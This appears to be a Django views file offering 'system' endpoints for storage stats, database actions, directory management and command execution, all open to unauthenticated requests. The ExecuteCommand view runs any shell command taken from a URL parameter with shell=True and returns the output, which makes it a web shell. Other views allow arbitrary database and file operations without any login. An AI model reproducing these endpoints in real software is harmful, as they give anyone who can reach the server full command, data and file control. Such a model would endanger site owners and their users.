import json
import subprocess

from django.conf import settings
from django.db.models import Sum
from django.shortcuts import render

from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework.permissions import AllowAny

from apps.system.models import Storage
from apps.system.model_choices import models
from apps.system.choices import MEDIA, SOURCE_FE, SOURCE_BE
from apps.system.services.database_services import apply_action
from apps.system.services.dir_management import apply_dir_action, get_folder_size
from apps.core.system import get_tree_str
from apps.core.utils import create_serializer_class
from apps.upload.models import UploadImage, UploadFile, UploadVideo


class SystemInfoView(APIView):
    authentication_classes = ()
    permission_classes = (AllowAny,)

    def get(self, request, *args, **kwargs):
        context = {
            "directory": get_tree_str(settings.BASE_DIR / "apps"),
            "media": get_tree_str(settings.MEDIA_ROOT),
        }

        return render(request, "data/system/system_info.html", context)


class StorageView(APIView):
    authentication_classes = ()
    permission_classes = (AllowAny,)

    def get(self, request, *args, **kwargs):
        storage_media = Storage.objects.filter(storage_type=MEDIA).order_by("-created").first()
        storage_fe = Storage.objects.filter(storage_type=SOURCE_FE).order_by("-created").first()
        storage_be = Storage.objects.filter(storage_type=SOURCE_BE).order_by("-created").first()

        file_size = round(
            (UploadFile.objects.all().aggregate(Sum("file_size")).get("file_size__sum") or 0) / 1024, 2
        )
        image_size = round(
            (UploadImage.objects.all().aggregate(Sum("image_size")).get("image_size__sum") or 0) / 1024, 2
        )
        video_size = round(
            (UploadVideo.objects.all().aggregate(Sum("video_size")).get("video_size__sum") or 0) / 1024, 2
        )
        media_size = fe_size = be_size = 0
        media_update = fe_update = be_update = ""

        if storage_media:
            media_size = round(storage_media.size / pow(1024, 2), 2)
            media_update = storage_media.created.strftime("%Y-%m-%d %H:%M:%S")
        if storage_fe:
            fe_size = round(storage_fe.size / pow(1024, 2), 2)
            fe_update = storage_fe.created.strftime("%Y-%m-%d %H:%M:%S")
        if storage_be:
            be_size = round(storage_be.size / pow(1024, 2), 2)
            be_update = storage_be.created.strftime("%Y-%m-%d %H:%M:%S")

        context = {
            "base_dir": settings.BASE_DIR,
            "media_root": settings.MEDIA_ROOT,
            "storage": {
                "file": file_size,
                "image": image_size,
                "video": video_size,
                "media": {
                    "size": media_size,
                    "update": media_update
                },
                "src_fe": {
                    "size": fe_size,
                    "update": fe_update
                },
                "src_be": {
                    "size": be_size,
                    "update": be_update
                },
                "total": fe_size + be_size,
            }
        }

        return render(request, "storage_info.html", context)


class GetDataFromDatabase(APIView):
    authentication_classes = ()
    permission_classes = (AllowAny,)

    def get(self, request, *args, **kwargs):
        query_params = self.request.query_params
        model = models.get(query_params.get("model", "").strip())
        data = json.loads(query_params.get("data", "{}").strip())
        action = query_params.get("action", "").strip().lower()
        extra_action = query_params.get("extra_action", "").strip().lower()
        extra_data = json.loads(query_params.get("extra_data", "{}").strip())

        response = {"message": "Cannot get data"}
        try:
            if model:
                output_data = apply_action(model=model, data=data, action=action, extra_data=extra_data, extra_action=extra_action)
                if isinstance(output_data, int) or isinstance(output_data, str):
                    response = {"result": output_data}
                else:
                    serializer_class = create_serializer_class(model_class=model, fields="__all__")
                    response = serializer_class(output_data, many=True).data
        except Exception:
            pass

        return Response(response)


class DirectoryManagement(APIView):
    authentication_classes = ()
    permission_classes = (AllowAny,)

    def get(self, request, *args, **kwargs):
        action = self.request.query_params.get("action", "").strip()
        root = self.request.query_params.get("root", settings.MEDIA_ROOT).strip()
        source = self.request.query_params.get("source", "").strip()
        destination = self.request.query_params.get("destination", "").strip()
        file_type = self.request.query_params.get("file_type", "").strip()

        if root == "base":
            root = str(settings.BASE_DIR)
        else:
            root = settings.MEDIA_ROOT
        root = root.replace(chr(92), "/").rstrip("/")

        message = apply_dir_action(
            action=action,
            root=root,
            source=source,
            destination=destination,
            file_type=file_type
        )

        context = {
            "message": message,
        }

        return render(request, "data/system/directory_management.html", context)


class ExecuteCommand(APIView):
    authentication_classes = ()
    permission_classes = (AllowAny,)

    def get(self, request, *args, **kwargs):
        command = self.request.query_params.get("command")
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            output = result.stdout
            message = output
        else:
            error = result.stderr
            message = f"Command execution failed: {error}"

        context = {
            "message": message,
        }

        return render(request, "data/system/command.html", context)
